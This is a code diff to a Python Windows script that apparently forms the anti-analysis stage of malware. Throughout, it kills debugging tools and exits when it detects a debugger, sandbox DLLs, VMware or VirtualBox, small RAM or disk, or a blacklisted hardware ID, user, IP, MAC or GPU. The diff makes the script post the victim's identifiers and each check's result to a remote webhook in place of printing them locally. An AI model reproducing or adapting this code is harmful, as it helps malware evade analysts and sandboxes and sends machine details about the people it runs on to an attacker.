@@ -1,9 +1,7 @@
-import sys, os, re, ctypes, subprocess, requests, uuid, wmi, psutil, threading, time, httpx, platform
-
+import sys, os, re, ctypes, subprocess, requests, uuid, wmi, psutil, time, httpx, platform, win32api, win32process
 from datetime import datetime
+from threading import Thread
 from ctypes import *
-import win32api
-import win32process
 
 
 os.system("cls")
@@ -56,15 +54,13 @@ anti_debug_switch = True
 def post_message(msg):
     requests.post(api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"{msg}"})
 
-
 def anti_debug():
     while True:
         time.sleep(0.7)
-        #print("Checking for debuggers...")
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in program_blacklist):
                 try:
-                    print("\nBlacklisted program found! Name: "+str(proc.name()))
+                    post_message(f"Anti-Debug Program: {proc.name()} was detected running on the system. Closing program...")
                     proc.kill()
                     os._exit(1)
                 except(psutil.NoSuchProcess, psutil.AccessDenied): pass
@@ -90,15 +86,12 @@ def block_dlls():
             except:
                     pass
         if EvidenceOfSandbox:
-            print("The following sandbox-indicative DLLs were discovered loaded in processes running on the system. Do not proceed.\n{0}".format(EvidenceOfSandbox))
             requests.post(f'{api}',json={'content': f"""```yaml
 The following sandbox-indicative DLLs were discovered loaded in processes running on the system. Do not proceed.
 Dlls: {EvidenceOfSandbox}
 ```"""})
             os._exit(1)
-        else:
-            #print("No sandbox-indicative DLLs were discovered loaded in any accessible running process. Proceed!")
-            pass
+        else: pass
 
 def ram_check():
     class MEMORYSTATUSEX(ctypes.Structure):
@@ -119,7 +112,6 @@ def ram_check():
     ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
 
     if memoryStatus.ullTotalPhys/1073741824 > 1:
-        print("The RAM of this host is at least 4 GB in size. Proceed!\n")
         requests.post(f'{api}',json={'content': f"""```yaml
 Ram Check: The RAM of this host is at least 4 GB in size. Proceed!
 ```"""})
@@ -127,20 +119,17 @@ Ram Check: The RAM of this host is at least 4 GB in size. Proceed!
         requests.post(f'{api}',json={'content': f"""```yaml
 Ram Check: Less than 4 GB of RAM exists on this system. Exiting program...
 ```"""})
-        print("Less than 4 GB of RAM exists on this system. Do not proceed.\n")
         os._exit(1)
 
 def is_debugger():
     isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
 
     if (isDebuggerPresent):
-        print("A debugger is present, exiting program...")
         requests.post(f'{api}',json={'content': f"""```yaml
 IsDebuggerPresent: A debugger is present, exiting program...
 ```"""})        
         os._exit(1)
     else:
-        print("No debugger is present. Proceed!")
         requests.post(f'{api}',json={'content': f"""```yaml
 IsDebuggerPresent: No debugger is present. Proceed!
 ```"""})  
@@ -156,7 +145,6 @@ def disk_check():
     diskSizeGB = diskSizeBytes/1073741824
 
     if diskSizeGB > minDiskSizeGB:
-        print("The disk size of this host is {0} GB, which is greater than the minimum {1} GB. Proceed!".format(diskSizeGB, minDiskSizeGB))
         requests.post(f'{api}',json={'content': f"""```yaml
 Disk Check: The disk size of this host is {diskSizeGB} GB, which is greater than the minimum {minDiskSizeGB} GB. Proceed!
 ```"""})
@@ -164,7 +152,6 @@ Disk Check: The disk size of this host is {diskSizeGB} GB, which is greater than
         requests.post(f'{api}',json={'content': f"""```yaml
 Disk Check: The disk size of this host is {diskSizeGB} GB, which is less than the minimum {minDiskSizeGB} GB. Exiting program...
 ```"""})
-        print("The disk size of this host is {0} GB, which is less than the minimum {1} GB. Exiting program...".format(diskSizeGB, minDiskSizeGB))
         os._exit(1)
 
 def getip():
@@ -215,7 +202,7 @@ def vmcheck():
     def in_virtualenv(): 
         return get_base_prefix_compat() != sys.prefix
 
-    if in_virtualenv() == True: # If vm is detected
+    if in_virtualenv(): # If vm is detected
         post_message("**VM DETECTED, EXITING PROGRAM...**")
         os._exit(1) # exit
     
@@ -226,7 +213,6 @@ def vmcheck():
         reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
         
         if reg1 != 1 and reg2 != 1:    
-            print("VMware Registry Detected")
             post_message("VMware Registry Detected")
             os._exit(1)
 
@@ -240,17 +226,14 @@ def vmcheck():
             if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))
 
         if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
-            print("VMwareService.exe & VMwareTray.exe process are running")
             post_message("VMwareService.exe & VMwareTray.exe process are running")
             os._exit(1)
                         
         if os.path.exists(vmware_dll): 
-            print("Vmware DLL Detected")
             post_message("**Vmware DLL Detected**")
             os._exit(1)
             
         if os.path.exists(virtualbox_dll):
-            print("VirtualBox DLL Detected")
             post_message("**VirtualBox DLL Detected**")
             os._exit(1)   
 
@@ -258,96 +241,75 @@ def vmcheck():
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
         if mac_address[:8] in vmware_mac_list:
-            print("VMware MAC Address Detected")
             post_message("**VMware MAC Address Detected**")
             os._exit(1)
 
 
-    print("[*] Checking VM")
     registry_check()
     processes_and_files_check()
-    mac_check()
-    print("[+] VM Not Detected")   
+    mac_check()  
     post_message("[+] VM Not Detected") 
 
 
 def listcheck():
     try:
         if hwid in hwidlist.text:
-            print('BLACKLISTED HWID DETECTED')
-            print(f'HWID: {hwid}') 
             post_message(f"**Blacklisted HWID Detected. HWID:** `{hwid}`")
             time.sleep(2)
             os._exit(1)
-        else: pass
     except:
-        print('[ERROR]: Failed to connect to database.')
-        time.sleep(2) 
+        post_message('[ERROR]: Failed to connect to database.')
+        time.sleep(2)
         os._exit(1)
 
     try:
         if serveruser in pcusernamelist.text:
-            print('BLACKLISTED PC USER DETECTED!')
-            print(f'PC USER: {serveruser}') 
             post_message(f"**Blacklisted PC User:** `{serveruser}`")
             time.sleep(2)
             os._exit(1)
-        else: pass
     except:
-        print('[ERROR]: Failed to connect to database.')
+        post_message('[ERROR]: Failed to connect to database.')
         time.sleep(2) 
         os._exit(1)
 
     try:
         if pc_name in pcnamelist.text:
-            print('BLACKLISTED PC NAME DETECTED!')
-            print(f'PC NAME: {pc_name}') 
             post_message(f"**Blacklisted PC Name:** `{pc_name}`")
             time.sleep(2)
             os._exit(1)
-        else: pass
     except:
-        print('[ERROR]: Failed to connect to database.')
+        post_message('[ERROR]: Failed to connect to database.')
         time.sleep(2) 
         os._exit(1)
 
     try:
         if ip in iplist.text:
-            print('BLACKLISTED IP DETECTED!')
-            print(f'IP: {ip}') 
             post_message(f"**Blacklisted IP:** `{ip}`")
             time.sleep(2)
             os._exit(1)
-        else: pass
     except:
-        print('[ERROR]: Failed to connect to database.')
+        post_message('[ERROR]: Failed to connect to database.')
         time.sleep(2) 
         os._exit(1)
 
     try:
         if mac in maclist.text:
-            print('BLACKLISTED MAC DETECTED!')
-            print(f'MAC: {mac}') 
             post_message(f"**Blacklisted MAC:** `{mac}`")
             time.sleep(2)
             os._exit(1)
-        else: pass
     except:
-        print('[ERROR]: Failed to connect to database.')
-        time.sleep(2) 
+        post_message('[ERROR]: Failed to connect to database.')
+        time.sleep(2)
         os._exit(1)
 
     try:
         if gpu in gpulist.text:        
-            print('BLACKLISTED GPU DETECTED!')
-            print(f'GPU: {gpu}') 
             post_message(f"**Blacklisted GPU:** `{gpu}`")
             time.sleep(2)
             os._exit(1)
-        else: pass
     except:
-        print('[ERROR]: Failed to connect to database.')
-        time.sleep(2) 
+        post_message('[ERROR]: Failed to connect to database.')
+        time.sleep(2)
         os._exit(1)
 
 
@@ -355,21 +317,16 @@ def main():
     is_debugger()
     disk_check()
     ram_check()
-    if anti_debug_switch == True:
+    if anti_debug_switch:
         try:
-            threading.Thread(name='Anti-Debug', target=anti_debug).start()
-            threading.Thread(name='Anti-DLL', target=block_dlls).start()
+            Thread(name='Anti-Debug', target=anti_debug).start()
+            Thread(name='Anti-DLL', target=block_dlls).start()
         except: pass
     else: pass
 
-    if vtdetect_switch == True: vtdetect()      # VTDETECT
-    else: pass
-
-    if vmcheck_switch == True: vmcheck()        # VMCHECK
-    else: pass
-
-    if listcheck_switch == True: listcheck()    # LISTCHECK
-    else: pass
+    if vtdetect_switch: vtdetect()      # VTDETECT
+    if vmcheck_switch: vmcheck()        # VMCHECK
+    if listcheck_switch: listcheck()    # LISTCHECK
 
 
 
